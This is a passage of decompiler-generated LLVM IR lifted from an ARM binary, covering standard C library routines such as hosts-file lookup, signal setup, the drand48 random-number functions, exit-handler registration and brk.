  %v1_196e4 = inttoptr i32 %v0_196e0 to i8*
  %v2_196e4 = call i32 @__GI_fclose(i8* %v1_196e4)
  store i32 %v2_196e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_196f8

dec_label_pc_196ec:                               ; preds = %dec_label_pc_194d4
  %v0_196ec = call i32 @__GI___h_errno_location()
  store i32 %v0_196ec, i32* %r0.global-to-local, align 4
  %v2_196f4 = inttoptr i32 %v0_196ec to i32*
  store i32 3, i32* %v2_196f4, align 4
  br label %dec_label_pc_196f8

dec_label_pc_196f8:                               ; preds = %entry, %dec_label_pc_196e0, %dec_label_pc_196ec
  store i32 %v2_19488, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 104204, i32* @lr, align 4
  %v1_19708 = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v1_19708, i32* %r0.global-to-local, align 4
  %v2_19710 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_19710, i32* @r4, align 4
  store i32 %v6_19480, i32* @r5, align 4
  store i32 %v9_19480, i32* @r6, align 4
  store i32 %v12_19480, i32* @r7, align 4
  store i32 %v15_19480, i32* @r8, align 4
  store i32 %v18_19480, i32* @sl, align 4
  ret i32 %v1_19708

; uselistorder directives
  uselistorder i32 %v3_194f013, { 2, 1, 0 }
  uselistorder i32 %v2_196a0, { 1, 0 }
  uselistorder i32 %v0_196ac, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_19674, { 1, 0 }
  uselistorder i32 %v1_1967465, { 1, 0 }
  uselistorder i32 %v2_19600, { 1, 0 }
  uselistorder i32 %v0_1960c, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1953c, { 1, 0 }
  uselistorder i32 %storemerge, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v0_1957c20, { 1, 0, 2 }
  uselistorder i32 %v2_19534, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_19484, { 5, 6, 8, 7, 3, 4, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 14, 4, 2, 3, 5, 0, 8, 6, 7, 9, 16, 10, 15, 11, 13, 12, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 6, 5, 22, 8, 7, 9, 11, 10, 13, 12, 15, 14, 23, 16, 17, 20, 18, 21, 25, 24, 19, 3, 2, 26, 28, 0, 27 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2f634.934 to i32), { 3, 5, 1, 0, 4, 2 }
  uselistorder i32* @global_var_2f654.930, { 2, 3, 1, 0, 7, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_2f654.930 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2f644.682 to i32), { 1, 0, 2 }
  uselistorder i8 32, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 13, 12, 14, 11, 17, 16, 15, 18, 19 }
  uselistorder i32* @global_var_2f650.679, { 0, 3, 1, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_2abe0.674 to i32), { 0, 5, 6, 1, 7, 2, 8, 3, 9, 4, 10, 11 }
  uselistorder label %dec_label_pc_196f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_194f0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1969c, { 1, 0 }
  uselistorder label %dec_label_pc_1964c, { 1, 0 }
  uselistorder label %dec_label_pc_19664.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_19620, { 1, 0, 2 }
  uselistorder label %dec_label_pc_195fc, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %dec_label_pc_195a8, { 1, 0 }
  uselistorder label %dec_label_pc_195a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19588, { 1, 0 }
  uselistorder label %dec_label_pc_19574, { 1, 0 }
  uselistorder label %dec_label_pc_19554, { 1, 0 }
  uselistorder label %dec_label_pc_196c0.backedge, { 1, 0, 3, 5, 2, 4 }
  uselistorder label %dec_label_pc_19510, { 2, 1, 0 }
  uselistorder label %dec_label_pc_196c0.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_19790 = call i32 @__read_etc_hosts_r()
  ret i32 %v0_19790
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1979c = load i32, i32* @r4, align 4
  store i32 %v3_1979c, i32* %stack_var_-12, align 4
  %v6_1979c = load i32, i32* @r5, align 4
  %v10_1979c = ptrtoint i32* %stack_var_-12 to i32
  %v7_197a0 = icmp eq i32 %arg2, -1
  %v0_197ac.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_197a0, label %.thread, label %bb

.thread:                                          ; preds = %entry
  br label %dec_label_pc_197c4

bb:                                               ; preds = %entry
  %v2_197a8 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_197ac.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_197ac.pre, 1
  br i1 %tmp19, label %dec_label_pc_197c4, label %dec_label_pc_197b4

dec_label_pc_197b4:                               ; preds = %bb
  %v7_197b8 = icmp sgt i32 %v0_197ac.pre, 64
  br i1 %v7_197b8, label %dec_label_pc_197c4, label %bb20

bb20:                                             ; preds = %dec_label_pc_197b4
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_197e824 = add i32 %v10_1979c, 124
  store i32 %v5_197e824, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_197d8

dec_label_pc_197c4:                               ; preds = %.thread, %dec_label_pc_197b4, %bb
  %v0_197c4 = call i32 @__errno_location()
  store i32 %v0_197c4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_197d0 = inttoptr i32 %v0_197c4 to i32*
  store i32 22, i32* %v2_197d0, align 4
  %v0_19844.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19844

dec_label_pc_197d8:                               ; preds = %bb20, %dec_label_pc_197d8
  %v5_197e825 = phi i32 [ %v5_197e824, %bb20 ], [ %v5_197e8, %dec_label_pc_197d8 ]
  %v2_197dc = add i32 %v5_197e825, -136
  %v3_197dc = inttoptr i32 %v2_197dc to i32*
  store i32 0, i32* %v3_197dc, align 4
  %v0_197e0.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_197e0 = add i32 %v0_197e0.pre, -1
  store i32 %v1_197e0, i32* %r0.global-to-local, align 4
  %v6_197e0 = icmp slt i32 %v1_197e0, 0
  %v4_197e8 = mul i32 %v1_197e0, 4
  %v5_197e8 = add i32 %v4_197e8, %v10_1979c
  store i32 %v5_197e8, i32* %r2.global-to-local, align 4
  br i1 %v6_197e0, label %dec_label_pc_197f0, label %dec_label_pc_197d8

dec_label_pc_197f0:                               ; preds = %dec_label_pc_197d8
  %v2_197f0 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_197f0, i32* @r5, align 4
  %v2_197f4 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_197f4, i32* @r0, align 4
  %v0_197f8 = load i32, i32* @r4, align 4
  store i32 %v0_197f8, i32* @r1, align 4
  %v0_197fc = call i32 @__sigaddset()
  store i32 %v0_197fc, i32* %r0.global-to-local, align 4
  %v1_19800 = icmp slt i32 %v0_197fc, 0
  br i1 %v1_19800, label %dec_label_pc_19840, label %dec_label_pc_19808

dec_label_pc_19808:                               ; preds = %dec_label_pc_197f0
  %v0_19808 = load i32, i32* @r4, align 4
  store i32 %v0_19808, i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2f658.960 to i32), i32* @r0, align 4
  %v0_19810 = call i32 @__sigismember()
  store i32 %v2_197a8, i32* %r2.global-to-local, align 4
  %v0_19828 = load i32, i32* @r4, align 4
  store i32 %v0_19828, i32* %r0.global-to-local, align 4
  %v4_19830 = call i32 @__GI_sigaction(i32 %v0_19828, i32* nonnull %stack_var_-152, i32 %v2_197a8)
  store i32 %v4_19830, i32* %r0.global-to-local, align 4
  %v1_19834 = icmp slt i32 %v4_19830, 0
  br i1 %v1_19834, label %dec_label_pc_19840, label %bb23

bb23:                                             ; preds = %dec_label_pc_19808
  %v5_19838 = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_19838, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19844

dec_label_pc_19840:                               ; preds = %dec_label_pc_19808, %dec_label_pc_197f0
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19844

dec_label_pc_19844:                               ; preds = %bb23, %dec_label_pc_197c4, %dec_label_pc_19840
  %v0_19844 = phi i32 [ %v5_19838, %bb23 ], [ %v0_19844.pre, %dec_label_pc_197c4 ], [ -1, %dec_label_pc_19840 ]
  store i32 %v0_19844, i32* %r0.global-to-local, align 4
  %v2_1984c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1984c, i32* @r4, align 4
  store i32 %v6_1979c, i32* @r5, align 4
  ret i32 %v0_19844

; uselistorder directives
  uselistorder i32 %v0_19844, { 1, 0 }
  uselistorder i32 %v5_197e8, { 1, 0 }
  uselistorder i32 %v1_197e0, { 0, 2, 1 }
  uselistorder i32 %v2_197a8, { 1, 0 }
  uselistorder i32 %v0_197ac.pre, { 1, 0, 2 }
  uselistorder i32 %v10_1979c, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 6, 5, 8, 7, 9, 0, 1 }
  uselistorder i32 (i32, i32*, i32)* @__GI_sigaction, { 0, 2, 3, 1 }
  uselistorder i32 ()* @__sigismember, { 1, 0, 2 }
  uselistorder i32 ()* @__sigaddset, { 3, 2, 1, 0, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_19844, { 2, 0, 1 }
  uselistorder label %dec_label_pc_197d8, { 1, 0 }
  uselistorder label %dec_label_pc_197c4, { 1, 2, 0 }
}

define i32 @lrand48_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1985c = call i32 @nrand48_r()
  ret i32 %v0_1985c
}

define i32 @nrand48_r() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_19860 = load i32, i32* @r4, align 4
  store i32 %v3_19860, i32* %stack_var_-12, align 4
  %v6_19860 = load i32, i32* @r5, align 4
  %v0_19864 = load i32, i32* @r2, align 4
  store i32 %v0_19864, i32* @r5, align 4
  %v0_19868 = load i32, i32* @r0, align 4
  store i32 %v0_19868, i32* @r4, align 4
  %v0_1986c = call i32 @__drand48_iterate()
  %v1_19870 = icmp slt i32 %v0_1986c, 0
  br i1 %v1_19870, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v5_19878 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_19878, i32* @r4, align 4
  store i32 %v6_19860, i32* @r5, align 4
  ret i32 -1

bb4:                                              ; preds = %entry
  %v0_1987c = load i32, i32* @r4, align 4
  %v1_1987c = add i32 %v0_1987c, 3
  %v2_1987c = inttoptr i32 %v1_1987c to i8*
  %v3_1987c = load i8, i8* %v2_1987c, align 1
  %v4_1987c = zext i8 %v3_1987c to i32
  %v1_19880 = add i32 %v0_1987c, 2
  %v2_19880 = inttoptr i32 %v1_19880 to i8*
  %v3_19880 = load i8, i8* %v2_19880, align 1
  %v4_19880 = zext i8 %v3_19880 to i32
  %v1_19884 = add i32 %v0_1987c, 4
  %v2_19884 = inttoptr i32 %v1_19884 to i8*
  %v3_19884 = load i8, i8* %v2_19884, align 1
  %v4_19884 = zext i8 %v3_19884 to i32
  %v1_19888 = add i32 %v0_1987c, 5
  %v2_19888 = inttoptr i32 %v1_19888 to i8*
  %v3_19888 = load i8, i8* %v2_19888, align 1
  %v4_19888 = zext i8 %v3_19888 to i32
  %v4_1988c = mul nuw nsw i32 %v4_1987c, 256
  %v5_1988c = or i32 %v4_19880, %v4_1988c
  %v4_19890 = mul nuw nsw i32 %v4_19888, 256
  %v5_19890 = or i32 %v4_19890, %v4_19884
  %v3_19894 = udiv i32 %v5_1988c, 2
  %v4_19898 = mul nuw i32 %v5_19890, 32768
  %v5_19898 = or i32 %v4_19898, %v3_19894
  %v1_198a0 = load i32, i32* @r5, align 4
  %v2_198a0 = inttoptr i32 %v1_198a0 to i32*
  store i32 %v5_19898, i32* %v2_198a0, align 4
  %v2_198a4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_198a4, i32* @r4, align 4
  store i32 %v6_19860, i32* @r5, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1987c, { 1, 0, 2, 3 }
}

define i32 @__GI_srand48_r(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp2 = sext i8 %arg1 to i32
  %v4_198a81 = udiv i32 %tmp2, 65536
  %v1_198ac = trunc i32 %v4_198a81 to i8
  %v4_198ac = add i32 %arg2, 4
  %v5_198ac = inttoptr i32 %v4_198ac to i8*
  store i8 %v1_198ac, i8* %v5_198ac, align 1
  store i32 14, i32* %r3.global-to-local, align 4
  store i8 14, i8* %tmp, align 1
  %v0_198bc = load i32, i32* %r3.global-to-local, align 4
  %v1_198bc = add i32 %v0_198bc, 37
  %v1_198c0 = trunc i32 %v1_198bc to i8
  %v4_198c0 = add i32 %arg2, 1
  %v5_198c0 = inttoptr i32 %v4_198c0 to i8*
  store i8 %v1_198c0, i8* %v5_198c0, align 1
  %v4_198c8 = add i32 %arg2, 12
  %v5_198c8 = inttoptr i32 %v4_198c8 to i8*
  store i8 11, i8* %v5_198c8, align 1
  store i32 0, i32* %ip.global-to-local, align 4
  %v4_198d4 = add i32 %arg2, 14
  %v5_198d4 = inttoptr i32 %v4_198d4 to i8*
  store i8 1, i8* %v5_198d4, align 1
  store i32 -554899859, i32* %r3.global-to-local, align 4
  %v4_198dc = sdiv i32 %tmp2, 256
  store i32 %v4_198dc, i32* %lr.global-to-local, align 4
  %v4_198e0 = sdiv i32 %tmp2, 16777216
  store i32 %v4_198e0, i32* %r2.global-to-local, align 4
  %v5_198e4 = add i32 %arg2, 2
  %v6_198e4 = inttoptr i32 %v5_198e4 to i8*
  store i8 %arg1, i8* %v6_198e4, align 1
  store i32 5, i32* %r4.global-to-local, align 4
  %v0_198ec = load i32, i32* %ip.global-to-local, align 4
  %v0_198f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_198f0 = trunc i32 %v0_198f0 to i8
  %v4_198f0 = add i32 %arg2, 5
  %v5_198f0 = inttoptr i32 %v4_198f0 to i8*
  store i8 %v1_198f0, i8* %v5_198f0, align 1
  %v0_198f4 = load i32, i32* %lr.global-to-local, align 4
  %v1_198f4 = trunc i32 %v0_198f4 to i8
  %v4_198f4 = add i32 %arg2, 3
  %v5_198f4 = inttoptr i32 %v4_198f4 to i8*
  store i8 %v1_198f4, i8* %v5_198f4, align 1
  %v0_198f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_198f8 = trunc i32 %v0_198f8 to i8
  %v4_198f8 = add i32 %arg2, 15
  %v5_198f8 = inttoptr i32 %v4_198f8 to i8*
  store i8 %v1_198f8, i8* %v5_198f8, align 1
  %v0_198fc = load i32, i32* %r3.global-to-local, align 4
  %v3_198fc = add i32 %arg2, 16
  %v4_198fc = inttoptr i32 %v3_198fc to i32*
  store i32 %v0_198fc, i32* %v4_198fc, align 4
  %v0_19900 = load i32, i32* %r4.global-to-local, align 4
  %v3_19900 = add i32 %arg2, 20
  %v4_19900 = inttoptr i32 %v3_19900 to i32*
  store i32 %v0_19900, i32* %v4_19900, align 4
  %v0_19904 = load i32, i32* %ip.global-to-local, align 4
  %v1_19904 = trunc i32 %v0_19904 to i8
  %v4_19904 = add i32 %arg2, 13
  %v5_19904 = inttoptr i32 %v4_19904 to i8*
  store i8 %v1_19904, i8* %v5_19904, align 1
  ret i32 %v0_198ec

; uselistorder directives
  uselistorder i32 %tmp2, { 1, 2, 0 }
}

define i32 @__exit_handler(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19910 = load i32, i32* @r4, align 4
  store i32 %v3_19910, i32* %stack_var_-8, align 4
  br label %.thread1

dec_label_pc_1991c:                               ; preds = %.thread1
  %v2_19920 = add i32 %v2_19990, %v3_19984
  %v3_19920 = inttoptr i32 %v2_19920 to i32*
  %v4_19920 = load i32, i32* %v3_19920, align 4
  store i32 %v4_19920, i32* @r2, align 4
  %v7_19924 = icmp eq i32 %v4_19920, 2
  store i32 %v1_1997c, i32* @global_var_2f518.963, align 4
  br i1 %v7_19924, label %dec_label_pc_19940, label %dec_label_pc_19934

dec_label_pc_19934:                               ; preds = %dec_label_pc_1991c
  %v7_19934 = icmp eq i32 %v4_19920, 3
  br i1 %v7_19934, label %dec_label_pc_19960, label %.thread1

dec_label_pc_19940:                               ; preds = %dec_label_pc_1991c
  %v1_19940 = add i32 %v2_19920, 4
  %v2_19940 = inttoptr i32 %v1_19940 to i32*
  %v3_19940 = load i32, i32* %v2_19940, align 4
  store i32 %v3_19940, i32* @r2, align 4
  %v2_19944 = icmp eq i32 %v3_19940, 0
  br i1 %v2_19944, label %.thread1, label %dec_label_pc_19950

dec_label_pc_19950:                               ; preds = %dec_label_pc_19940
  call void @__pseudo_branch(i32 %v3_19940)
  br label %.thread1

dec_label_pc_19960:                               ; preds = %dec_label_pc_19934
  %v1_19960 = add i32 %v2_19920, 4
  %v2_19960 = inttoptr i32 %v1_19960 to i32*
  %v3_19960 = load i32, i32* %v2_19960, align 4
  store i32 %v3_19960, i32* @r2, align 4
  %v2_19964 = icmp eq i32 %v3_19960, 0
  br i1 %v2_19964, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_19960
  call void @__pseudo_branch(i32 %v3_19960)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_19960, %dec_label_pc_19934, %dec_label_pc_19940, %dec_label_pc_19950, %bb, %entry
  %v2_19978 = load i32, i32* @global_var_2f518.963, align 4
  %v1_1997c = add i32 %v2_19978, -1
  %v2_19980 = icmp eq i32 %v2_19978, 0
  %v3_19984 = mul i32 %v1_1997c, 16
  store i32 %v3_19984, i32* %ip.global-to-local, align 4
  %v2_19990 = load i32, i32* @global_var_2f51c.965, align 4
  br i1 %v2_19980, label %dec_label_pc_19990, label %dec_label_pc_1991c

dec_label_pc_19990:                               ; preds = %.thread1
  store i32 %v2_19990, i32* @r0, align 4
  %v2_19994 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19994, i32* @r4, align 4
  %v0_19998 = call i32 @free()
  %v0_1999c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1999c, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_19990
  %v1_1999c = load i32, i32* @r2, align 4
  %v2_1999c = load i32, i32* @r8, align 4
  %v3_1999c = load i32, i32* @r5, align 4
  %v8_1999c = shl i32 %v2_1999c, %v3_1999c
  %v9_1999c = and i32 %v8_1999c, %v1_1999c
  call void @__pseudo_branch(i32 %v9_1999c)
  %v0_199a0.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_199a0.pr, label %bb6, label %.thread2

bb6:                                              ; preds = %bb5
  %v1_199a0 = load i32, i32* @r2, align 4
  %v2_199a0 = load i32, i32* %ip.global-to-local, align 4
  %v3_199a0 = load i32, i32* @r5, align 4
  %v8_199a0 = shl i32 %v2_199a0, %v3_199a0
  %v9_199a0 = and i32 %v8_199a0, %v1_199a0
  call void @__pseudo_branch(i32 %v9_199a0)
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_19990, %bb5, %bb6
  ret i32 %v0_19998

; uselistorder directives
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread1, { 4, 0, 3, 2, 1, 5 }
}

define i32 @__new_exitfn() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_199a4 = load i32, i32* @r4, align 4
  %v6_199a4 = load i32, i32* @r5, align 4
  %v2_199a8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 ptrtoint (i32* @global_var_2ab98.756 to i32), i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 %v2_199a8, i32* @r0, align 4
  store i32 58060, i32* %r3.global-to-local, align 4
  store i32 104900, i32* %lr.global-to-local, align 4
  %v1_199c0 = call i32 @__pthread_cleanup_push_defer()
  store i32 62768, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2ab98.756 to i32), i32* %r0.global-to-local, align 4
  store i32 104916, i32* @lr, align 4
  %v2_199d0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2ab98.756 to i32))
  store i32 %v2_199d0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2f520.972 to i32), i32* @r5, align 4
  %v2_199dc = load i32, i32* @global_var_2f518.963, align 4
  %v2_199e0 = load i32, i32* @global_var_2f520.972, align 4
  store i32 %v2_199e0, i32* %r2.global-to-local, align 4
  %v1_199e4 = add i32 %v2_199dc, 1
  store i32 %v1_199e4, i32* %r3.global-to-local, align 4
  %v3_199e8 = mul i32 %v2_199e0, 16
  store i32 ptrtoint (i32* @global_var_2f51c.965 to i32), i32* @r6, align 4
  %v1_199f4 = add i32 %v3_199e8, 320
  store i32 %v1_199f4, i32* %r1.global-to-local, align 4
  %v6_199f8 = icmp slt i32 %v2_199e0, %v1_199e4
  br i1 %v6_199f8, label %dec_label_pc_199fc, label %dec_label_pc_19a2c

dec_label_pc_199fc:                               ; preds = %entry
  %v2_199fc = load i32, i32* @global_var_2f51c.965, align 4
  store i32 %v2_199fc, i32* %r0.global-to-local, align 4
  %v2_19a00 = call i32 @realloc(i32 %v2_199fc, i32 %v1_199f4)
  store i32 %v2_19a00, i32* %r0.global-to-local, align 4
  store i32 %v2_19a00, i32* @r4, align 4
  %v2_19a04 = icmp eq i32 %v2_19a00, 0
  br i1 %v2_19a04, label %dec_label_pc_19a0c, label %dec_label_pc_19a1c

dec_label_pc_19a0c:                               ; preds = %dec_label_pc_199fc
  %v0_19a0c = call i32 @__errno_location()
  store i32 %v0_19a0c, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_19a14 = inttoptr i32 %v0_19a0c to i32*
  store i32 12, i32* %v2_19a14, align 4
  br label %dec_label_pc_19a60

dec_label_pc_19a1c:                               ; preds = %dec_label_pc_199fc
  %v2_19a1c = load i32, i32* @global_var_2f520.972, align 4
  %v1_19a20 = add i32 %v2_19a1c, 20
  store i32 %v1_19a20, i32* %r3.global-to-local, align 4
  %v1_19a24 = load i32, i32* @r6, align 4
  %v2_19a24 = inttoptr i32 %v1_19a24 to i32*
  store i32 %v2_19a00, i32* %v2_19a24, align 4
  %v0_19a28 = load i32, i32* %r3.global-to-local, align 4
  %v1_19a28 = load i32, i32* @r5, align 4
  %v2_19a28 = inttoptr i32 %v1_19a28 to i32*
  store i32 %v0_19a28, i32* %v2_19a28, align 4
  %v2_19a34.pre = load i32, i32* @global_var_2f518.963, align 4
  br label %dec_label_pc_19a2c

dec_label_pc_19a2c:                               ; preds = %entry, %dec_label_pc_19a1c
  %v2_19a34 = phi i32 [ %v2_199dc, %entry ], [ %v2_19a34.pre, %dec_label_pc_19a1c ]
  store i32 ptrtoint (i32* @global_var_2f518.963 to i32), i32* %lr.global-to-local, align 4
  %v2_19a38 = load i32, i32* @global_var_2f51c.965, align 4
  store i32 %v2_19a38, i32* %r0.global-to-local, align 4
  %v1_19a3c = add i32 %v2_19a34, 1
  store i32 %v1_19a3c, i32* %ip.global-to-local, align 4
  %v3_19a44 = mul i32 %v2_19a34, 16
  store i32 %v3_19a44, i32* %r2.global-to-local, align 4
  %v3_19a48 = add i32 %v2_19a38, %v3_19a44
  %v4_19a48 = inttoptr i32 %v3_19a48 to i32*
  store i32 1, i32* %v4_19a48, align 4
  store i32 104720, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2f3d8.760 to i32), i32* %r3.global-to-local, align 4
  %v0_19a54 = load i32, i32* %ip.global-to-local, align 4
  %v1_19a54 = load i32, i32* %lr.global-to-local, align 4
  %v2_19a54 = inttoptr i32 %v1_19a54 to i32*
  store i32 %v0_19a54, i32* %v2_19a54, align 4
  %v0_19a58 = load i32, i32* %r1.global-to-local, align 4
  %v1_19a58 = load i32, i32* %r3.global-to-local, align 4
  %v2_19a58 = inttoptr i32 %v1_19a58 to i32*
  store i32 %v0_19a58, i32* %v2_19a58, align 4
  %v0_19a5c = load i32, i32* %r2.global-to-local, align 4
  %v1_19a5c = load i32, i32* %r0.global-to-local, align 4
  %v2_19a5c = add i32 %v1_19a5c, %v0_19a5c
  store i32 %v2_19a5c, i32* @r4, align 4
  br label %dec_label_pc_19a60

dec_label_pc_19a60:                               ; preds = %dec_label_pc_19a0c, %dec_label_pc_19a2c
  store i32 %v2_199a8, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 58236, i32* %r3.global-to-local, align 4
  store i32 105076, i32* @lr, align 4
  %v1_19a70 = call i32 @__pthread_cleanup_pop_restore()
  %v0_19a74 = load i32, i32* @r4, align 4
  store i32 %v0_19a74, i32* %r0.global-to-local, align 4
  store i32 %v3_199a4, i32* @r4, align 4
  store i32 %v6_199a4, i32* @r5, align 4
  ret i32 %v0_19a74

; uselistorder directives
  uselistorder i32 %v3_19a44, { 1, 0 }
  uselistorder i32 %v2_199e0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 7, 5, 0, 6 }
  uselistorder i32 ()* @__pthread_cleanup_pop_restore, { 21, 18, 10, 9, 8, 7, 6, 4, 3, 0, 20, 23, 22, 19, 5, 12, 11, 14, 13, 2, 1, 17, 16, 15 }
  uselistorder i32* @global_var_2f3d8.760, { 1, 0 }
  uselistorder i32 (i32, i32)* @realloc, { 1, 2, 0 }
  uselistorder i32* @global_var_2f51c.965, { 0, 1, 3, 2 }
  uselistorder i32* @global_var_2f518.963, { 4, 0, 2, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_2ab98.756 to i32), { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_19a60, { 1, 0 }
  uselistorder label %dec_label_pc_19a2c, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19aa8 = add i32 %arg1, 28
  %v2_19aa8 = inttoptr i32 %v1_19aa8 to i32*
  %v3_19aa8 = load i32, i32* %v2_19aa8, align 4
  %v1_19ab0 = add i32 %arg1, 44
  %v2_19ab0 = inttoptr i32 %v1_19ab0 to i32*
  %v3_19ab0 = load i32, i32* %v2_19ab0, align 4
  store i32 %v3_19aa8, i32* @global_var_2f6d8.978, align 4
  store i32 %v3_19ab0, i32* @global_var_2f6dc.980, align 4
  ret i32 %arg1
}

define i32 @__GI_brk(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_19ad4 = call i32 @brk(i32* %arg1)
  %v3_19ad8 = icmp ult i32 %v2_19ad4, %tmp
  store i32 0, i32* @r2, align 4
  store i32 %v2_19ad4, i32* @global_var_2f524.834, align 4
  br i1 %v3_19ad8, label %dec_label_pc_19aec, label %dec_label_pc_19afc

dec_label_pc_19aec:                               ; preds = %entry
  %v0_19aec = call i32 @__errno_location()
  %v2_19af4 = inttoptr i32 %v0_19aec to i32*
  store i32 12, i32* %v2_19af4, align 4
  store i32 -1, i32* @r2, align 4
  br label %dec_label_pc_19afc

dec_label_pc_19afc:                               ; preds = %entry, %dec_label_pc_19aec
  %v0_19afc = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_19aec ]
  ret i32 %v0_19afc

; uselistorder directives
  uselistorder i32* @global_var_2f524.834, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_19afc, { 1, 0 }
}

define i32 @__cmsg_nxthdr() local_unnamed_addr {
entry:
  %v0_19b08 = load i32, i32* @r1, align 4
  %v1_19b08 = inttoptr i32 %v0_19b08 to i32*
  %v2_19b08 = load i32, i32* %v1_19b08, align 4
  %v1_19b0c = add i32 %v2_19b08, 3
